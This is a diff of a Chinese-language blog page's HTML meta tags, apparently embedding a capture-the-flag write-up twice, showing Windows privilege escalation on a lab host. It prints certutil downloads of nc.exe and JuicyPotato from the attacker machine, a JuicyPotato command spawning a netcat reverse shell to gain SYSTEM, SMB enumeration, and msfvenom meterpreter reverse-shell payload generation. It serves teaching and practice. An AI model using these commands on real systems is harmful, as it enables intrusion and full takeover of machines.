@@ -313,7 +313,169 @@ SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Desha
 
 ```
 
-我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。">
+我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。
+
+![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)
+
+```bash
+PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
+****  En l?nea  ****
+  0000  ...
+  e800
+CertUtil: -URLCache comando completado correctamente.
+PS C:\tmp> dir
+
+
+    Directorio: C:\tmp
+
+
+Mode                LastWriteTime     Length Name                            
+----                -------------     ------ ----                            
+-a---        02/01/2025     15:19      59392 nc.exe                          
+
+
+PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
+****  En l?nea  ****
+  000000  ...
+  054e00
+CertUtil: -URLCache comando completado correctamente.
+PS C:\tmp> dir
+
+
+    Directorio: C:\tmp
+
+
+Mode                LastWriteTime     Length Name                            
+----                -------------     ------ ----                            
+-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
+-a---        02/01/2025     15:19      59392 nc.exe                          
+
+
+
+```
+
+先将`JuicyPotato.exe`和`nc.exe`传上目标机器
+
+```bash
+./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a '/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567' -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
+```
+
+运行`JuicyPotato.exe`
+
+```bash
+└─$ nc -lvnp 4567    
+listening on [any] 4567 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
+Microsoft Windows [Versi�n 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+```
+
+成功拿到**system**权限
+
+---
+
+# 4.总结
+
+在`BerserkWings`、`ll104567`大佬那学了点技术[笑脸]
+
+## 4.1 分析 SMB 服务
+
+**检查域**、**操作系统版本**、**是否可以访客登录**等
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ crackmapexec smb 192.168.205.221
+SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
+                                                                                                                                   
+┌──(kali㉿kali)-[~/test]
+└─$ netexec smb 192.168.205.221                    
+SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
+                          
+```
+
+列出与 **smblcient** 共享的文件
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient -L //192.168.205.221// -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available                                                         
+```
+
+自动化脚本
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbmap -H 192.168.205.221        
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /'       )|'  \    /'  ||   _  '\ |'  \    /'  |     /''\       |   __ '\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /' \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
+[!] Access denied on 192.168.205.221, no fun for you...                                                                
+[*] Closed 1 connections                                                                                                   
+                                  
+```
+
+## 4.2 windows常用命令
+
+```bash
+# 查看操作系统 （OS） 信息
+systeminfo
+# 查看拥有权限
+whoami /priv
+# 下载攻击机文件
+copy \\192.168.205.141\nc.exe .
+```
+
+## 4.3 msf
+
+生成**shell**
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Saved as: msf.exe
+
+```
+
+连接**shell**
+
+```bash
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+
+自动化漏洞挖掘（要有msf的shell）
+
+```bash
+msf6 > post/multi/recon/local_exploit_suggester
+```sentence">
 <meta property="og:title" content="thl_ensala-papas">
 <meta property="og:description" content="# thl_ensala-papas
 
@@ -621,7 +783,169 @@ SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Desha
 
 ```
 
-我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。">
+我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。
+
+![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)
+
+```bash
+PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
+****  En l?nea  ****
+  0000  ...
+  e800
+CertUtil: -URLCache comando completado correctamente.
+PS C:\tmp> dir
+
+
+    Directorio: C:\tmp
+
+
+Mode                LastWriteTime     Length Name                            
+----                -------------     ------ ----                            
+-a---        02/01/2025     15:19      59392 nc.exe                          
+
+
+PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
+****  En l?nea  ****
+  000000  ...
+  054e00
+CertUtil: -URLCache comando completado correctamente.
+PS C:\tmp> dir
+
+
+    Directorio: C:\tmp
+
+
+Mode                LastWriteTime     Length Name                            
+----                -------------     ------ ----                            
+-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
+-a---        02/01/2025     15:19      59392 nc.exe                          
+
+
+
+```
+
+先将`JuicyPotato.exe`和`nc.exe`传上目标机器
+
+```bash
+./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a '/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567' -c '{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}'
+```
+
+运行`JuicyPotato.exe`
+
+```bash
+└─$ nc -lvnp 4567    
+listening on [any] 4567 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
+Microsoft Windows [Versi�n 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+```
+
+成功拿到**system**权限
+
+---
+
+# 4.总结
+
+在`BerserkWings`、`ll104567`大佬那学了点技术[笑脸]
+
+## 4.1 分析 SMB 服务
+
+**检查域**、**操作系统版本**、**是否可以访客登录**等
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ crackmapexec smb 192.168.205.221
+SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
+                                                                                                                                   
+┌──(kali㉿kali)-[~/test]
+└─$ netexec smb 192.168.205.221                    
+SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
+                          
+```
+
+列出与 **smblcient** 共享的文件
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbclient -L //192.168.205.221// -N
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available                                                         
+```
+
+自动化脚本
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ smbmap -H 192.168.205.221        
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /'       )|'  \    /'  ||   _  '\ |'  \    /'  |     /''\       |   __ '\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /' \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
+[!] Access denied on 192.168.205.221, no fun for you...                                                                
+[*] Closed 1 connections                                                                                                   
+                                  
+```
+
+## 4.2 windows常用命令
+
+```bash
+# 查看操作系统 （OS） 信息
+systeminfo
+# 查看拥有权限
+whoami /priv
+# 下载攻击机文件
+copy \\192.168.205.141\nc.exe .
+```
+
+## 4.3 msf
+
+生成**shell**
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Saved as: msf.exe
+
+```
+
+连接**shell**
+
+```bash
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+
+自动化漏洞挖掘（要有msf的shell）
+
+```bash
+msf6 > post/multi/recon/local_exploit_suggester
+```sentence">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/thl_ensala-papas.html">
 <meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
